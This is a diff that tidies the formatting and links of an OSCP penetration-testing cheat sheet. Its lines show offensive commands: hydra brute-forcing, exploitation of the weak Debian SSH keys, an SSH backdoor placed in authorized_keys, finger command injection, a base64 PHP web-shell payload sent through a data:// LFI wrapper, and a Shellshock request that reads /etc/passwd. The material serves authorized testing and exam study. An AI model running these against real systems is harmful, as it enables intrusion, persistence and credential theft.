@@ -19,7 +19,7 @@
 - [How To Pass the OSCP – a Beginner Friendly Guide](https://kentosec.com/2019/10/09/how-to-pass-the-oscp-a-beginner-friendly-guide/)
 - [Hakluke’s Ultimate OSCP Guide: Part 1 — Is OSCP for you? Some things you should know before you start](https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-1-is-oscp-for-you-b57cbcce7440)
 - [Hakluke’s Ultimate OSCP Guide: Part 2 — Workflow and documentation tips](https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-2-workflow-and-documentation-tips-9dd335204a48)
-- [https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97](https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97)
+- [Hakluke’s Ultimate OSCP Guide: Part 3 — Practical hacking tips and tricks](https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97)
 
 
 ## General Resources
@@ -49,13 +49,13 @@
 
 ## Buffer Overflow Resources
 - Resoureces
-  - [Buffer Overflows Made Easy](https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G)
+  - [Buffer Overflows Made Easy - The Cyber Mentor](https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G)
   - [Buffer Overflow personal cheatsheet](https://liodeus.github.io/2020/08/11/bufferOverflow.html)
 
 ## Tool Resources
 - Tools
-- [Autorecon]
-- [nmapAutomator](https://github.com/21y4d/nmapAutomator)
+  - [Autorecon](https://github.com/Tib3rius/AutoRecon)
+  - [nmapAutomator](https://github.com/21y4d/nmapAutomator)
 
 
 ## Enumeration
@@ -88,68 +88,68 @@
 
 ## FTP - 21
 - Brute force
-- `hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV`
+  - `hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV`
 
 - Downloading file
-- `ftp <IP>`
+  - `ftp <IP>`
 
 - PASSIVE
-- BINARY
-  - `get <FILE>`
-- Uploading file
-  - `ftp <IP>`
+  - BINARY
+    - `get <FILE>`
+  - Uploading file
+    - `ftp <IP>`
 - PASSIVE
-- BINARY
-  - `put <FILE>`
+  - BINARY
+    - `put <FILE>`
 
 ## SSH - 22
 - Brute force
-- `hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV`
+  - `hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV`
 
 - CVE-2008-0166
-- All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.
-- <https://www.exploit-db.com/exploits/5720>
+  - All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.
+  - <https://www.exploit-db.com/exploits/5720>
 
-- `wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2`
+  - `wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2`
 
-- `bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2`
-- `tar -xvf debian_ssh_rsa_2048_x86.tar`
-- `tar -xvf debian_ssh_dsa_1024_x86.tar`
+  - `bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2`
+  - `tar -xvf debian_ssh_rsa_2048_x86.tar`
+  - `tar -xvf debian_ssh_dsa_1024_x86.tar`
 
-- `python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>`
-- `python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>`
+  - `python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>`
+  - `python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>`
 
 ### SSH backdoor - post exploitation
 - Attacker
-- `ssh-keygen -f <FILENAME>`
-- `chmod 600 <FILENAME>`
-- `cat <FILENAME>.pub -> copy`
+  - `ssh-keygen -f <FILENAME>`
+  - `chmod 600 <FILENAME>`
+  - `cat <FILENAME>.pub -> copy`
 
 - Victim
-- `echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys`
+  - `echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys`
 
 - Connect
-- `ssh -i <FILENAME> <USER>@<IP>`
+  - `ssh -i <FILENAME> <USER>@<IP>`
 
 ## DNS - 53
-- `dnsenum <DOMAIN>`
-- `dnsrecon -d <DOMAIN>`
+  - `dnsenum <DOMAIN>`
+  - `dnsrecon -d <DOMAIN>`
 
-- Zone transfert
-- `dnsrecon -d <DOMAIN> -a`
-- `dig axfr <DOMAIN> @ns1.test.com`
+- Zone Transfers
+  - `dnsrecon -d <DOMAIN> -a`
+  - `dig axfr <DOMAIN> @ns1.test.com`
 
 ### DNS brute force
 - <https://github.com/blark/aiodnsbrute>
 
 ## FINGER - 79
 - User enumeration
-- `finger @<IP>`
-- `finger <USER>@<IP>`
+  - `finger @<IP>`
+  - `finger <USER>@<IP>`
 
 - Command execution
-- `finger "|/bin/id@<IP>"`
-- `finger "|/bin/ls -a /<IP>"`
+  - `finger "|/bin/id@<IP>"`
+  - `finger "|/bin/ls -a /<IP>"`
 
 ## HTTP - HTTPS - 80 - 443
 - Automatic scanners
@@ -255,11 +255,11 @@
 
   - `ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u <URL>/FUZZ -e .php,.txt -t <THREADS>`
   
-  - dirbuster
-    - 
+  - [dirbuster](https://tools.kali.org/web-applications/dirbuster)
+    - `dirbuster`
   
-  - gobuster
-    - 
+  - [gobuster](https://tools.kali.org/web-applications/gobuster)
+    - `gobuster -h`
 
   - Dictionaries :
     - /usr/share/wordlists/dirb/common.txt
@@ -275,13 +275,13 @@
 
   - Wrappers
     - Wrapper php://filter
-      - <http://example.com/index.php?page=php://filter/convert.base64-encode/resource>=
+      - <http://example.com/index.php?page=php://filter/convert.base64-encode/resource=>
     - Wrapper expect://
       - <http://example.com/index.php?page=expect://id>
     - Wrapper data://
       - `echo '<?php phpinfo(); ?>' | base64 -w0 -> PD9waHAgcGhwaW5mbygpOyA/Pgo=`
 
-    - <http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo>=
+    - <http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=>
 
     - If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.
 
@@ -294,7 +294,7 @@
 
     - Example:
       - `echo '<?php passthru($_GET["cmd"]);echo "Shell done !"; ?>' | base64 -w0 -> PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=`
-      - <http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo>=
+      - <http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=>
 
       - If there is "Shell done !" on the webpage, then there is code execution and you can do things like :
       - <http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&cmd=ls>
@@ -304,11 +304,11 @@
 
   - Useful LFI list
     - Linux
-      - /home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
+      - `/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt`
     - Windows
-      - /home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
+      - `/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt`
     - Both
-      - /home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
+      - `/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt`
 
   - Tools
     - `kadimus --url <URL>`
@@ -366,15 +366,15 @@
 - Modifying SNMP values
   - http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html
 
+
 ## LDAP - 389
 - Scans
   - `nmap -n -sV --script "ldap* and not brute"`
   - `ldapsearch -h <IP> -x -s base`
   - `ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"`
 
-
-## Graphical Interface
-- jxplorer
+  - Graphical Interface
+    - [jxplorer](http://jxplorer.org/)
 
 
 ## SMB - 445
@@ -540,7 +540,7 @@
 
 - Manual exploit
   - Cheatsheet :
-    - https://www.asafety.fr/mssql-injection-cheat-sheet/
+    - <https://www.asafety.fr/mssql-injection-cheat-sheet/>
 
 
 ## NFS - 2049
@@ -791,6 +791,7 @@
 - Download .git
   - `mkdir <DESTINATION_FOLDER>`
   - `./gitdumper.sh <URL>/.git/ <DESTINATION_FOLDER>`
+
 - Extract .git content
   - `mkdir <EXTRACT_FOLDER>`
   - `./extractor.sh <DESTINATION_FOLDER> <EXTRACT_FOLDER>`
@@ -1439,6 +1440,7 @@
 - Windows
   - `echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"`
 
+
 ## REVERSE SHELL
 - Amazing tool for shell generation
 - 
@@ -1500,6 +1502,7 @@
 ## SHELLSHOCK
 - `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL>/cgi-bin/<SCRIPT>`
 
+
 ## USEFUL LINUX COMMANDS
 - Find a file
   - `locate <FILE>`
@@ -1516,6 +1519,7 @@
   - `ps -faux`
 - List the allowed (and forbidden) commands for the invoking use
   - `sudo -l`
+
 
 ## USEFUL WINDOWS COMMANDS
 - 
